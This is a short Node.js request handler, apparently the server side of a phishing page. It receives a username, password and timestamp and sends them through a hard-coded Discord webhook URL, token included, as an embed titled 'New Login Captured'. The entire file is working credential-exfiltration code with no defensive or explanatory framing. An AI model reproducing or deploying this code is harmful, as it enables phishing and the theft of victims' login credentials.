module.exports = async (req, res) => {
  const u = "https://discord.com/api/webhooks/1408935972829401158/TMRXIF8bqJ7YzjXDGKGYi_4DeXgtPtI2JcJR_ecLP9FFyYq-fCC-u24tYVPQGnyx5Q8w";
  try {
    const { a, b, c } = req.body;
    if (!a || !b || !c) return res.status(400).json({ error: "Missing fields" });
    const r = await fetch(u, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "New Login Captured",
          fields: [
            { name: "Username", value: a, inline: true },
            { name: "Password", value: b, inline: true },
            { name: "Timestamp", value: c, inline: false }
          ],
          color: 0x00b0ff
        }]
      })
    });
    if (!r.ok) throw new Error("Request failed");
    res.status(200).json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "Server error" });
  }
};
